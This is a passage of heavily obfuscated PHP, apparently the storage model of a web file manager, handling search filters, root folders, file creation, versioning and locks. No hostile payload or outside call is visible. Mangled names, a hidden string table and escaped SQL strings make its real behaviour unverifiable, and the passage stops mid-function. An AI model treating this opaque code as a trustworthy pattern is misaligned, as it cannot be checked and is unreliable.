$è°êùŞì[$ò‚ï“»®[454]] != $ò‚ï“»®[1954]) { if ($è°êùŞì[$ò‚ï“»®[454]] == $ò‚ï“»®[75] && !$˜¢šş÷Œ) { return !1; } if ($è°êùŞì[$ò‚ï“»®[454]] != $ò‚ï“»®[75] && $˜¢šş÷Œ) { return !1; } if (!strstr($‹÷õ«‹Ş[$ò‚ï“»®[175]], $ò‚ï“»®[50] . $è°êùŞì[$ò‚ï“»®[454]] . $ò‚ï“»®[50])) { return !1; } } if (isset($è°êùŞì[$ò‚ï“»®[2161]]) && $è°êùŞì[$ò‚ï“»®[2161]] < $‹÷õ«‹Ş[$ò‚ï“»®[76]]) { return !1; } if (isset($è°êùŞì[$ò‚ï“»®[2162]]) && $è°êùŞì[$ò‚ï“»®[2162]] > $‹÷õ«‹Ş[$ò‚ï“»®[76]]) { return !1; } if (isset($è°êùŞì[$ò‚ï“»®[630]]) && $è°êùŞì[$ò‚ï“»®[630]] != $‹÷õ«‹Ş[$ò‚ï“»®[497]]) { return !1; } return !0; } public function listSearchChildren($¸Äš†Çæ, $»®Æ²çÃ = 5000) { $©ê˜›Şó =& $_SERVER[çâ¥×ø³]; $ºÁ•Íéî = array(); $‡­ŒÄ = $this->sourceInfo($¸Äš†Çæ); $©ŠÃ½Ğ— = array($©ê˜›Şó[553] => array($©ê˜›Şó[427], $‡­ŒÄ[$©ê˜›Şó[553]] . $‡­ŒÄ[$©ê˜›Şó[181]] . $©ê˜›Şó[581])); $¸Ş‹‹ß = $this->field($©ê˜›Şó[76])->where($©ŠÃ½Ğ—)->limit($»®Æ²çÃ + 1)->select(); $´ò‰ÔÇ© = is_array($¸Ş‹‹ß) ? count($¸Ş‹‹ß) : 0; if ($´ò‰ÔÇ© > $»®Æ²çÃ) { return $this->_listSearchChildrenNear($¸Äš†Çæ, $»®Æ²çÃ); } $êÕÃ¦ß² = $this->field($©ê˜›Şó[181])->where($©ŠÃ½Ğ—)->select(); $ºÁ•Íéî = array_to_keyvalue($êÕÃ¦ß², $©ê˜›Şó[12], $©ê˜›Şó[181]); return $ºÁ•Íéî; } private function _listSearchChildrenNear($ÌÂ’šİ´, $½•‹ç§) { $Ï¢ïú® =& $_SERVER[çâ¥×ø³]; $¤Šöº…Õ = array(); $»¹Ã–¹² = array($Ï¢ïú®[180] => $ÌÂ’šİ´); $‰ˆíÈÆ = $this->field($Ï¢ïú®[2163])->where($»¹Ã–¹²)->select(); $­Á’ä½“ = array_to_keyvalue(array_filter_by_field($‰ˆíÈÆ, $Ï¢ïú®[453], $Ï¢ïú®[88]), $Ï¢ïú®[12], $Ï¢ïú®[181]); $¤Šöº…Õ = array_merge($¤Šöº…Õ, array_to_keyvalue($‰ˆíÈÆ, $Ï¢ïú®[12], $Ï¢ïú®[181])); if (!$­Á’ä½“) { return $¤Šöº…Õ; } $»¹Ã–¹² = array($Ï¢ïú®[180] => array($Ï¢ïú®[7], $­Á’ä½“)); $‰ˆíÈÆ = $this->field($Ï¢ïú®[2163])->where($»¹Ã–¹²)->limit($½•‹ç§)->select(); $¤Šöº…Õ = array_merge($¤Šöº…Õ, array_to_keyvalue($‰ˆíÈÆ, $Ï¢ïú®[12], $Ï¢ïú®[181])); $¤Šöº…Õ = array_slice($¤Šöº…Õ, 0, $½•‹ç§); return $¤Šöº…Õ; } private function _listSearchBindPinyin($‡ÕÆŠÀ, &$“°Ëúˆ´, &$õ™“Ûõ) { $ëÆÓéÎí =& $_SERVER[çâ¥×ø³]; if (!isset($‡ÕÆŠÀ[$ëÆÓéÎí[1993]]) || !$‡ÕÆŠÀ[$ëÆÓéÎí[1993]]) { return; } if (!Input::check($‡ÕÆŠÀ[$ëÆÓéÎí[1993]], $ëÆÓéÎí[362]) || strlen($‡ÕÆŠÀ[$ëÆÓéÎí[1993]]) < 2) { return; } $¥ØË”ºí = "\114\x45\x46\x54\x20\112\x4f\111\116\40{$this->tablePrefix}\151\x6f\x5f\x73\157\165\162\x63\x65\x5f\x6d\145\164\141\x20\155\145\164\141\40\157\156\x20\x73\157\x75\x72\143\145\56\163\157\x75\x72\x63\x65\111\104\40\x3d\40\x6d\x65\x74\x61\56\x73\157\165\162\x63\145\x49\x44"; $ıÌŠ¢ô = array(); $õ™“Ûõ = str_replace(array($ëÆÓéÎí[246], $ëÆÓéÎí[53], $ëÆÓéÎí[2164]), $ëÆÓéÎí[12], $õ™“Ûõ); $õ™“Ûõ = $ëÆÓéÎí[479] . str_replace($ëÆÓéÎí[50], $ëÆÓéÎí[480], $õ™“Ûõ); $›€şˆ† = $“°Ëúˆ´[$ëÆÓéÎí[32]]; unset($“°Ëúˆ´[$ëÆÓéÎí[32]]); foreach ($“°Ëúˆ´ as $ßíûòø => $Äâƒ›¿Õ) { $ıÌŠ¢ô[$ëÆÓéÎí[479] . $ßíûòø] = $Äâƒ›¿Õ; } foreach ($›€şˆ† as $ı“ê³¼æ) { $ıÌŠ¢ô[] = array($ëÆÓéÎí[484] => $ı“ê³¼æ, $ëÆÓéÎí[1053] => $ëÆÓéÎí[1997], array($ëÆÓéÎí[2165] => $ı“ê³¼æ, $ëÆÓéÎí[2166] => array($ëÆÓéÎí[7], array($ëÆÓéÎí[506], $ëÆÓéÎí[505])))); } $this->join($¥ØË”ºí); $“°Ëúˆ´ = $ıÌŠ¢ô; } private function _parseSearchWhere($à®î®í) { $ÅØ½ÖÀ“ =& $_SERVER[çâ¥×ø³]; $¤·šÊ‹ = array(); if (isset($à®î®í[$ÅØ½ÖÀ“[809]]) && $à®î®í[$ÅØ½ÖÀ“[809]]) { $¤·šÊ‹[$ÅØ½ÖÀ“[85]] = array($ÅØ½ÖÀ“[2167], $à®î®í[$ÅØ½ÖÀ“[809]]); } if (isset($à®î®í[$ÅØ½ÖÀ“[810]]) && $à®î®í[$ÅØ½ÖÀ“[810]]) { $…Åˆ¬ó— = array($ÅØ½ÖÀ“[2168], $à®î®í[$ÅØ½ÖÀ“[810]]); if ($¤·šÊ‹[$ÅØ½ÖÀ“[85]]) { $¤·šÊ‹[$ÅØ½ÖÀ“[85]] = array($¤·šÊ‹[$ÅØ½ÖÀ“[85]], $…Åˆ¬ó—, $ÅØ½ÖÀ“[2169]); } else { $¤·šÊ‹[$ÅØ½ÖÀ“[85]] = $…Åˆ¬ó—; } } if (isset($à®î®í[$ÅØ½ÖÀ“[2161]]) && $à®î®í[$ÅØ½ÖÀ“[2161]] > 0) { $¤·šÊ‹[$ÅØ½ÖÀ“[76]] = array($ÅØ½ÖÀ“[2167], $à®î®í[$ÅØ½ÖÀ“[2161]]); } if (isset($à®î®í[$ÅØ½ÖÀ“[2162]]) && $à®î®í[$ÅØ½ÖÀ“[2162]]) { $…Åˆ¬ó— = array($ÅØ½ÖÀ“[2168], $à®î®í[$ÅØ½ÖÀ“[2162]]); if ($¤·šÊ‹[$ÅØ½ÖÀ“[76]]) { $¤·šÊ‹[$ÅØ½ÖÀ“[76]] = array($¤·šÊ‹[$ÅØ½ÖÀ“[76]], $…Åˆ¬ó—, $ÅØ½ÖÀ“[2169]); } else { $¤·šÊ‹[$ÅØ½ÖÀ“[76]] = $…Åˆ¬ó—; } } if (isset($à®î®í[$ÅØ½ÖÀ“[630]]) && $à®î®í[$ÅØ½ÖÀ“[630]]) { $¤·šÊ‹[] = array($ÅØ½ÖÀ“[497] => $à®î®í[$ÅØ½ÖÀ“[630]], $ÅØ½ÖÀ“[495] => $à®î®í[$ÅØ½ÖÀ“[630]], $ÅØ½ÖÀ“[1053] => $ÅØ½ÖÀ“[1997]); } if (isset($à®î®í[$ÅØ½ÖÀ“[454]]) && $à®î®í[$ÅØ½ÖÀ“[454]]) { $ÉˆåíÆô = $à®î®í[$ÅØ½ÖÀ“[454]]; if ($ÉˆåíÆô == $ÅØ½ÖÀ“[75]) { $¤·šÊ‹[$ÅØ½ÖÀ“[453]] = 1; } else { if ($ÉˆåíÆô == $ÅØ½ÖÀ“[2170]) { $¤·šÊ‹[$ÅØ½ÖÀ“[453]] = 0; } else { if ($ÉˆåíÆô) { $ÉˆåíÆô = is_array($ÉˆåíÆô) ? $ÉˆåíÆô : explode($ÅØ½ÖÀ“[50], $ÉˆåíÆô); $¤·šÊ‹[$ÅØ½ÖÀ“[454]] = array($ÅØ½ÖÀ“[460], $ÉˆåíÆô); $¤·šÊ‹[$ÅØ½ÖÀ“[453]] = 0; } } } } $this->_parseSearchParent($à®î®í, $¤·šÊ‹); if (isset($à®î®í[$ÅØ½ÖÀ“[1993]]) && trim($à®î®í[$ÅØ½ÖÀ“[1993]])) { $Ô§§íŞ = trim($à®î®í[$ÅØ½ÖÀ“[1993]]); $™İ¢»¡º = explode($ÅØ½ÖÀ“[53], $Ô§§íŞ); if (strlen($Ô§§íŞ) > 2 && (substr($Ô§§íŞ, 0, 1) == $ÅØ½ÖÀ“[118] && substr($Ô§§íŞ, -1) == $ÅØ½ÖÀ“[118]) || substr($Ô§§íŞ, 0, 1) == $ÅØ½ÖÀ“[58] && substr($Ô§§íŞ, -1) == $ÅØ½ÖÀ“[58]) { $Ô§§íŞ = substr($Ô§§íŞ, 1, -1); $™İ¢»¡º = array($Ô§§íŞ); } $¤·šÊ‹[$ÅØ½ÖÀ“[32]] = array(array($ÅØ½ÖÀ“[580], $ÅØ½ÖÀ“[1995] . $Ô§§íŞ . $ÅØ½ÖÀ“[1995])); if (count($™İ¢»¡º) > 1) { $¤·šÊ‹[$ÅØ½ÖÀ“[32]] = array(); foreach ($™İ¢»¡º as $¬ÈÃöôü) { if (!trim($¬ÈÃöôü)) { continue; } $¤·šÊ‹[$ÅØ½ÖÀ“[32]][] = array($ÅØ½ÖÀ“[580], $ÅØ½ÖÀ“[1995] . trim($¬ÈÃöôü) . $ÅØ½ÖÀ“[1995]); } } } return $¤·šÊ‹; } private function _parseSearchParent($°€Â¿‹, &$²…™ığñ) { $›ÅãÁ‡º =& $_SERVER[çâ¥×ø³]; if (!isset($°€Â¿‹[$›ÅãÁ‡º[180]]) || !$°€Â¿‹[$›ÅãÁ‡º[180]]) { return; } $î˜ï—½õ = $this->pathInfo($°€Â¿‹[$›ÅãÁ‡º[180]]); $¡¹È£— = $î˜ï—½õ[$›ÅãÁ‡º[180]] . $›ÅãÁ‡º[12] === $›ÅãÁ‡º[212]; $éì³˜úé = $î˜ï—½õ[$›ÅãÁ‡º[178]] == $›ÅãÁ‡º[547]; if ($î˜ï—½õ[$›ÅãÁ‡º[564]] == $›ÅãÁ‡º[565]) { $‚ãÈ„ùİ = $this->sourceInfo($°€Â¿‹[$›ÅãÁ‡º[180]]); $î˜ï—½õ[$›ÅãÁ‡º[553]] = $‚ãÈ„ùİ[$›ÅãÁ‡º[553]]; } $²…™ığñ[$›ÅãÁ‡º[620]] = array($›ÅãÁ‡º[580], $î˜ï—½õ[$›ÅãÁ‡º[553]] . $°€Â¿‹[$›ÅãÁ‡º[180]] . $›ÅãÁ‡º[581]); $ñÔºàÏä = isset($°€Â¿‹[$›ÅãÁ‡º[1858]]) && in_array($›ÅãÁ‡º[547], $°€Â¿‹[$›ÅãÁ‡º[1858]]); if (!$ñÔºàÏä || !$éì³˜úé || !$¡¹È£— || !$î˜ï—½õ[$›ÅãÁ‡º[455]]) { return; } if (!AuthModel::authCheckRoot($î˜ï—½õ[$›ÅãÁ‡º[455]][$›ÅãÁ‡º[456]])) { return; } $û´Ÿóß = $î˜ï—½õ[$›ÅãÁ‡º[538]] . $›ÅãÁ‡º[12]; if ($û´Ÿóß == $›ÅãÁ‡º[88]) { unset($²…™ığñ[$›ÅãÁ‡º[620]]); $²…™ığñ[$›ÅãÁ‡º[178]] = self::TYPE_GROUP; return; } $‡ÖåÈâ¾ = Model($›ÅãÁ‡º[554])->groupChildrenAll($û´Ÿóß); $¦ºÂÆõ = count($‡ÖåÈâ¾); if ($¦ºÂÆõ <= 1) { return; } $‰ÏĞÜû = array($›ÅãÁ‡º[180] => 0, $›ÅãÁ‡º[178] => self::TYPE_GROUP, $›ÅãÁ‡º[538] => array($›ÅãÁ‡º[7], $‡ÖåÈâ¾)); $õ™ƒÉ§ù = $this->field($›ÅãÁ‡º[2171])->where($‰ÏĞÜû)->limit($¦ºÂÆõ)->select(); $²…™ığñ[$›ÅãÁ‡º[620]] = array(); foreach ($õ™ƒÉ§ù as $­ÏôóÊ÷) { $²…™ığñ[$›ÅãÁ‡º[620]][] = array($›ÅãÁ‡º[580], $›ÅãÁ‡º[563] . $­ÏôóÊ÷[$›ÅãÁ‡º[181]] . $›ÅãÁ‡º[581]); } $²…™ığñ[$›ÅãÁ‡º[620]][] = $›ÅãÁ‡º[1997]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($á‘¢¨¦¹) { $û·Ò¼æ =& $_SERVER[çâ¥×ø³]; $ˆÅª—Çû = Model($û·Ò¼æ[546])->where(array($û·Ò¼æ[1692] => $á‘¢¨¦¹))->find(); $Ñ™ïùƒØ = $this->_mkdirRoot(SourceModel::TYPE_USER, $á‘¢¨¦¹, $ˆÅª—Çû[$û·Ò¼æ[32]]); $this->userDesktopAdd($Ñ™ïùƒØ); return $Ñ™ïùƒØ; } public function userDesktopAdd($ı¾üê’) { $¸È‘Çóë =& $_SERVER[çâ¥×ø³]; $©¢§÷ã¾ = LNG($¸È‘Çóë[2172]); $³úîüúà = $this->mkdir($ı¾üê’, $©¢§÷ã¾); $this->metaSet($³úîüúà, $¸È‘Çóë[2173], $¸È‘Çóë[88]); $this->metaSet($ı¾üê’, $¸È‘Çóë[2174], $³úîüúà); } public function userPathSafeAdd($ßÊÛˆî‰) { $¦Şóò¨ =& $_SERVER[çâ¥×ø³]; $É‘ˆõÜ‡ = Model($¦Şóò¨[546])->getInfoFull($ßÊÛˆî‰); if (!$É‘ˆõÜ‡) { return !1; } if (_get($É‘ˆõÜ‡, $¦Şóò¨[568])) { return $É‘ˆõÜ‡[$¦Şóò¨[507]][$¦Şóò¨[2175]]; } $‰æ‰äö‘ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ßÊÛˆî‰, $¦Şóò¨[2176], $¦Şóò¨[474]); Model($¦Şóò¨[546])->metaSet($ßÊÛˆî‰, $¦Şóò¨[2175], $‰æ‰äö‘); $this->metaSet($‰æ‰äö‘, $¦Şóò¨[2177], $ßÊÛˆî‰); return $‰æ‰äö‘; } public function groupRootAdd($ÁóéÄÍµ) { $¤×Ğàƒİ =& $_SERVER[çâ¥×ø³]; $¢Ä¡¢·¸ = Model($¤×Ğàƒİ[554])->where(array($¤×Ğàƒİ[1987] => $ÁóéÄÍµ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ÁóéÄÍµ, $¢Ä¡¢·¸[$¤×Ğàƒİ[32]]); } public function systemRootPathAdd($š½ÛŒ²²) { if ($š½ÛŒ²² != $_SERVER[çâ¥×ø³][574]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $š½ÛŒ²²); } public function userRootRemove($ãŸòƒì¬) { $˜ßğôê˜ = $this->targetSourceRoot(SourceModel::TYPE_USER, $ãŸòƒì¬, !0); foreach ($˜ßğôê˜ as $„÷‚û§Ô) { if (!$„÷‚û§Ô) { continue; } $this->remove($„÷‚û§Ô[$_SERVER[çâ¥×ø³][181]], !1); } } public function groupRootRemove($µ‚×”É³) { $ÑÕñÓÅ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $µ‚×”É³); if (!$ÑÕñÓÅ) { return; } $this->remove($ÑÕñÓÅ[$_SERVER[çâ¥×ø³][181]], !1); } private function _mkdirRoot($î½°ˆÈ, $®ŞŞåÈ, $ö’ÉÚè, $ÛøÈ “¶ = '') { $·úËÊö” =& $_SERVER[çâ¥×ø³]; $¢®‰›§³ = defined($·úËÊö”[2120]) ? USER_ID : 0; $êšªó¿İ = array($·úËÊö”[445] => 0, $·úËÊö”[616] => $î½°ˆÈ, $·úËÊö”[617] => $®ŞŞåÈ, $·úËÊö”[614] => 1, $·úËÊö”[618] => $¢®‰›§³, $·úËÊö”[619] => $¢®‰›§³, $·úËÊö”[615] => $ÛøÈ “¶, $·úËÊö”[620] => $·úËÊö”[563], $·úËÊö”[472] => 0, $·úËÊö”[585] => 0, $·úËÊö”[510] => 0, $·úËÊö”[621] => $·úËÊö”[12]); if ($·ş¤Ì¶„ = $this->where($êšªó¿İ)->find()) { return $·ş¤Ì¶„[$·úËÊö”[181]]; } $í’áÏÜÁ = "\x4d\157\x64\145\154\123\157\x75\x72\x63\145\x2e\155\x6b\144\x69\x72\x52\157\157\x74\x2e{$î½°ˆÈ}\56{$®ŞŞåÈ}\x2e" . $ö’ÉÚè; CacheLock::lock($í’áÏÜÁ); $êšªó¿İ[$·úËÊö”[32]] = $ö’ÉÚè; $õ„Áüœû = $this->add($êšªó¿İ); $‡Ä™‚ÕÆ = array($·úËÊö”[622] => short_id($õ„Áüœû)); $this->where(array($·úËÊö”[459] => $õ„Áüœû))->save($‡Ä™‚ÕÆ); CacheLock::unlock($í’áÏÜÁ); return $õ„Áüœû; } private function targetSourceRoot($Ş¯¸–¤’, $Ì¨¸¥ŞÏ, $½¾Ñ»ß = false) { $³ü‘ãØÚ =& $_SERVER[çâ¥×ø³]; $ô¡º¥çº = array($³ü‘ãØÚ[445] => 0, $³ü‘ãØÚ[616] => $Ş¯¸–¤’, $³ü‘ãØÚ[617] => $Ì¨¸¥ŞÏ); if ($½¾Ñ»ß) { $é£Ş•÷ = $this->where($ô¡º¥çº)->select(); return $é£Ş•÷ ? $é£Ş•÷ : array(); } $“¿±œÜÆ = $this->where($ô¡º¥çº)->find(); return $“¿±œÜÆ ? $“¿±œÜÆ : array(); } public function sourceRootGroup($áªáÙÌ) { $Ïœ³¸”¶ =& $_SERVER[çâ¥×ø³]; if (is_string($áªáÙÌ)) { $áªáÙÌ = array($áªáÙÌ); } $’ÂÙÆ• = $this->listSourceRoot(SourceModel::TYPE_GROUP, $áªáÙÌ, $Ïœ³¸”¶[203]); $Ş­ãä = array($Ïœ³¸”¶[413] => $’ÂÙÆ•, $Ïœ³¸”¶[410] => array($Ïœ³¸”¶[807] => count($áªáÙÌ))); $this->_listDataApply($Ş­ãä[$Ïœ³¸”¶[413]]); $this->_listMake($Ş­ãä); return array_to_keyvalue($Ş­ãä[$Ïœ³¸”¶[82]], $Ïœ³¸”¶[538]); } public function mkfile($ŞÑúŸŞ½, $ëª‘²ÕŒ, $ò–×úì« = '', $‡ˆßı× = REPEAT_RENAME) { $ªäìÒÁ¢ =& $_SERVER[çâ¥×ø³]; $½íÜíœÃ = Model($ªäìÒÁ¢[643])->addFileByContent($ò–×úì«, $ëª‘²ÕŒ); return $this->_createFileCall($ŞÑúŸŞ½, $ëª‘²ÕŒ, $½íÜíœÃ, $‡ˆßı×, $ªäìÒÁ¢[1395]); } public function addFile($É¤âÖì, $õÛÜ˜¯Ğ, $ÖôŒ…Ş©, $î°ˆ«œŞ = false, $é¢µ«êä = REPEAT_RENAME) { $Û©ã·«ò = Model($_SERVER[çâ¥×ø³][643])->addFile($õÛÜ˜¯Ğ, $ÖôŒ…Ş©, $î°ˆ«œŞ); return $this->_createFileCall($É¤âÖì, $ÖôŒ…Ş©, $Û©ã·«ò, $é¢µ«êä); } public function addFileByFileID($üÚê£­˜, $Õ³ëÙŸ”, $´µêê€Ú, $…«Ò¾ê = REPEAT_RENAME) { $ÖˆÓ½•¡ =& $_SERVER[çâ¥×ø³]; $´Î®ßˆ· = Model($ÖˆÓ½•¡[643])->find($Õ³ëÙŸ”); Model($ÖˆÓ½•¡[643])->linkAdd($Õ³ëÙŸ”); return $this->_createFileCall($üÚê£­˜, $´µêê€Ú, $´Î®ßˆ·, $…«Ò¾ê); } public function addFileByRemote($¿Êë­øß, $æáÖ—œ½, $¡ùºùáœ, $¡Ç¨–Åõ = array(), $şöÀÄŞ¶ = REPEAT_RENAME) { $¹ìö³’Ğ = Model($_SERVER[çâ¥×ø³][643])->addFileByRemote($æáÖ—œ½, $¡ùºùáœ, $¡Ç¨–Åõ); return $this->_createFileCall($¿Êë­øß, $¡ùºùáœ, $¹ìö³’Ğ, $şöÀÄŞ¶); } private function _createFileCall($›¡œäÒ÷, $á‹óÆ•Ë, $‚¼ÅË¼î, $€‘¥ä„£, $çÖ¬ºˆ = "\165\x70\x6c\x6f\x61\144") { $™¯«„Óã =& $_SERVER[çâ¥×ø³]; $©àÜı¶ = !1; $this->setMasterDB(); $this->lockWriteStart($›¡œäÒ÷, $á‹óÆ•Ë); $èùÓõÊ = $this->fileNameExist($›¡œäÒ÷, $á‹óÆ•Ë); $ˆ–”î‚à = $this->_createFile($›¡œäÒ÷, $á‹óÆ•Ë, $‚¼ÅË¼î, $€‘¥ä„£, $©àÜı¶); if (!$©àÜı¶) { Model($™¯«„Óã[512])->remove($‚¼ÅË¼î[$™¯«„Óã[509]]); } if ($©àÜı¶ && $ˆ–”î‚à && $ˆ–”î‚à != $èùÓõÊ) { Model($™¯«„Óã[2145])->eventCreate($ˆ–”î‚à, $çÖ¬ºˆ); } $this->lockWriteEnd($›¡œäÒ÷, $á‹óÆ•Ë); return $ˆ–”î‚à; } public function mkdir($ã°„æ‰ñ, $½ï‰‹•, $£¯©Ô¡½ = REPEAT_SKIP) { $Øù²Ö‡Ÿ =& $_SERVER[çâ¥×ø³]; $this->setMasterDB(); $ø¢ä˜´  = $this->sourceInfo($ã°„æ‰ñ); if (!$ø¢ä˜´ ) { return !1; } $this->lockWriteStart($ã°„æ‰ñ, $½ï‰‹•); if ($£¯©Ô¡½ !== !1) { $àò°‚ÓÖ = $this->fileNameExist($ã°„æ‰ñ, $½ï‰‹•); if ($àò°‚ÓÖ && $£¯©Ô¡½ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ã°„æ‰ñ, $½ï‰‹•); return $àò°‚ÓÖ; } $½ï‰‹• = $this->fileNameAuto($ã°„æ‰ñ, $½ï‰‹•, $£¯©Ô¡½); } $Ê·ˆî å = array($Øù²Ö‡Ÿ[614] => 1, $Øù²Ö‡Ÿ[462] => $½ï‰‹•, $Øù²Ö‡Ÿ[615] => $Øù²Ö‡Ÿ[12], $Øù²Ö‡Ÿ[510] => 0, $Øù²Ö‡Ÿ[585] => 0); $‚ÀåÍáÓ = $this->_addSource($Ê·ˆî å, $ø¢ä˜´ ); Model($Øù²Ö‡Ÿ[2145])->eventCreate($‚ÀåÍáÓ, $Øù²Ö‡Ÿ[1396]); $this->lockWriteEnd($ã°„æ‰ñ, $½ï‰‹•); return $‚ÀåÍáÓ; } public function listSourceRoot($Óõ½§æ, $ƒÕşâ, $²®¬˜Šï = "\x73\x6f\165\x72\x63\145\111\104\x2c\164\x61\x72\x67\x65\164\x49\x44\54\163\x69\172\145") { $ÂÎ´¤‡ =& $_SERVER[çâ¥×ø³]; $†¢Úû”¤ = $ÂÎ´¤‡[422]; $û˜Î×›£ = array(); $œ™İ³‡ = 1024 * 50; $İ§™í¹ = is_array($İ§™í¹) ? $İ§™í¹ : array(); $şœÔåÕ› = count($ƒÕşâ); $¸‡ª‘– = $this->tablePrefix . $ÂÎ´¤‡[2178]; for ($ÑçÎâØ« = 0; $ÑçÎâØ« < $şœÔåÕ›; $ÑçÎâØ«++) { $Ôî¡Šˆ = $ƒÕşâ[$ÑçÎâØ«]; $†¢Úû”¤ .= "\123\x45\114\105\x43\x54\x20\x2a\40\x46\x52\x4f\115\40\x28\123\105\x4c\x45\103\x54\40{$²®¬˜Šï}\x20\106\122\x4f\x4d\x20\140{$¸‡ª‘–}\140\x20\x57\x48\105\122\105\40"; $†¢Úû”¤ .= "\140\x70\x61\162\x65\x6e\164\x49\x44\x60\75\x30\x20\101\116\104\40\x60\x74\141\162\x67\x65\164\x49\x44\x60\x3d{$Ôî¡Šˆ}\x20\101\x4e\104\40\x60\x74\x61\x72\147\145\x74\x54\x79\160\145\140\x3d{$Óõ½§æ}\x20\141\x6e\144\x20\146\151\154\x65\x54\x79\160\145\75\x27\x27\x20\154\151\x6d\x69\164\x20\61\x29\40\141\163\x20\164\x62\x5f{$ÑçÎâØ«}\x20\x55\116\x49\x4f\x4e\x20\x41\x4c\x4c\40"; if ((strlen($†¢Úû”¤) >= $œ™İ³‡ || $ÑçÎâØ« == $şœÔåÕ› - 1) && $†¢Úû”¤) { $†¢Úû”¤ = substr($†¢Úû”¤, 0, -strlen($ÂÎ´¤‡[1091])); $Ã™‡äå = $this->query($†¢Úû”¤); $†¢Úû”¤ = $ÂÎ´¤‡[12]; $û˜Î×›£ = array_merge($û˜Î×›£, $Ã™‡äå); } } return $û˜Î×›£; } private function _createFile($âòÑ½«, $“×á®¹’, $îÆÉ¿è…, $Ã¢“ã´», &$ò­„ü›²) { $¿‹²½ãã =& $_SERVER[çâ¥×ø³]; $ùã‡ÖºÑ = $this->sourceInfo($âòÑ½«); if (!$îÆÉ¿è… || !$ùã‡ÖºÑ) { return !1; } if ($Ã¢“ã´» !== !1) { $ÄÚÂÜ®Ã = $this->fileNameExist($âòÑ½«, $“×á®¹’); } $ò­„ü›² = !0; if ($Ã¢“ã´» && $ÄÚÂÜ®Ã) { if ($Ã¢“ã´» == REPEAT_SKIP) { $ò­„ü›² = !1; return $ÄÚÂÜ®Ã; } else { if ($Ã¢“ã´» == REPEAT_REPLACE) { $®«¹ÈÅÖ = $this->sourceInfo($ÄÚÂÜ®Ã); $ƒ¾®Åàğ = $this->fileHistory($®«¹ÈÅÖ, $îÆÉ¿è…[$¿‹²½ãã[509]], $îÆÉ¿è…[$¿‹²½ãã[76]]); if (!$ƒ¾®Åàğ) { $ò­„ü›² = !1; } else { $this->folderSizeReset($âòÑ½«); } return $ÄÚÂÜ®Ã; } else { $“×á®¹’ = $this->fileNameAuto($âòÑ½«, $“×á®¹’, $Ã¢“ã´», !1); } } } $”î¾â÷É = array($¿‹²½ãã[614] => 0, $¿‹²½ãã[462] => $“×á®¹’, $¿‹²½ãã[615] => substr(get_path_ext($“×á®¹’), 0, 10), $¿‹²½ãã[510] => $îÆÉ¿è…[$¿‹²½ãã[509]], $¿‹²½ãã[585] => $îÆÉ¿è…[$¿‹²½ãã[76]]); $»şØöì§ = $this->_addSource($”î¾â÷É, $ùã‡ÖºÑ); $this->folderSizeReset($âòÑ½«, intval($”î¾â÷É[$¿‹²½ãã[76]])); return $»şØöì§; } protected function fileHistory($ö€„¤, $Ô—›íÃ‰, $Ô¨š‘ú) { $´Ÿ²õ¶ã =& $_SERVER[çâ¥×ø³]; if ($ö€„¤[$´Ÿ²õ¶ã[509]] == $Ô—›íÃ‰) { return !1; } $this->checkLock($ö€„¤[$´Ÿ²õ¶ã[181]], $Ô—›íÃ‰); Model($´Ÿ²õ¶ã[2179])->addHistory($ö€„¤); $ß›¤¿û = array($´Ÿ²õ¶ã[619] => USER_ID, $´Ÿ²õ¶ã[466] => time(), $´Ÿ²õ¶ã[509] => $Ô—›íÃ‰, $´Ÿ²õ¶ã[76] => $Ô¨š‘ú); $this->where(array($´Ÿ²õ¶ã[459] => $ö€„¤[$´Ÿ²õ¶ã[181]]))->save($ß›¤¿û); $this->sourceCacheClear($ö€„¤[$´Ÿ²õ¶ã[181]]); return !0; } public function checkLock($ªÈËà©ê, $àğ¨±üé) { $ıèÑŞ·ç =& $_SERVER[çâ¥×ø³]; $öı¡¥ = $this->pathInfo($ªÈËà©ê); if (!$this->fileIsLock($öı¡¥, !0)) { return; } $Ëßã”Ø· = Session::get($ıèÑŞ·ç[2180]); $õ¡¢´Í = substr($öı¡¥[$ıèÑŞ·ç[32]], 0, -1 - strlen($öı¡¥[$ıèÑŞ·ç[175]])) . $ıèÑŞ·ç[1261] . $Ëßã”Ø· . $ıèÑŞ·ç[10] . $öı¡¥[$ıèÑŞ·ç[175]]; $Ò‡ùˆ€õ = Model($ıèÑŞ·ç[643])->find($àğ¨±üé); $this->_createFileCall($öı¡¥[$ıèÑŞ·ç[180]], $õ¡¢´Í, $Ò‡ùˆ€õ, REPEAT_REPLACE, $ıèÑŞ·ç[1395]); $™æËÚÊÃ = $öı¡¥[$ıèÑŞ·ç[507]][$ıèÑŞ·ç[578]]; $“™¬Å = $™æËÚÊÃ[$ıèÑŞ·ç[2181]] ? $™æËÚÊÃ[$ıèÑŞ·ç[2181]] : $™æËÚÊÃ[$ıèÑŞ·ç[32]]; show_json(LNG($ıèÑŞ·ç[2182]) . $ıèÑŞ·ç[2183] . LNG($ıèÑŞ·ç[2184]) . $ıèÑŞ·ç[2185] . $“™¬Å . $ıèÑŞ·ç[2186], !1); } public function fileIsLock($éïÇ¼ŒÙ, $£ÕÒ²ú¼ = false) { $«¹µ½é =& $_SERVER[çâ¥×ø³]; if (!isset($éïÇ¼ŒÙ[$«¹µ½é[507]]) || !$éïÇ¼ŒÙ[$«¹µ½é[507]][$«¹µ½é[575]]) { return !1; } if ($éïÇ¼ŒÙ[$«¹µ½é[507]][$«¹µ½é[575]] != USER_ID) { return !0; } $¼§üÚ‡ı = $GLOBALS[$«¹µ½é[6]][$«¹µ½é[89]][$«¹µ½é[576]]; if ($éïÇ¼ŒÙ[$«¹µ½é[507]][$«¹µ½é[577]] <= time() - $¼§üÚ‡ı) { $this->metaSet($éïÇ¼ŒÙ[$«¹µ½é[181]], $«¹µ½é[575], null); $this->metaSet($éïÇ¼ŒÙ[$«¹µ½é[181]], $«¹µ½é[577], null); } if ($£ÕÒ²ú¼) { $this->metaSet($éïÇ¼ŒÙ[$«¹µ½é[181]], $«¹µ½é[577], time()); } return !1; } private function _addSource($î©™€‹Ÿ, $ËÁ¾Ó€°) { $ÂíÒşİµ =& $_SERVER[çâ¥×ø³]; $·“³àºú = defined($ÂíÒşİµ[2120]) ? USER_ID : 0; $ŠÅÑÊï¹ = 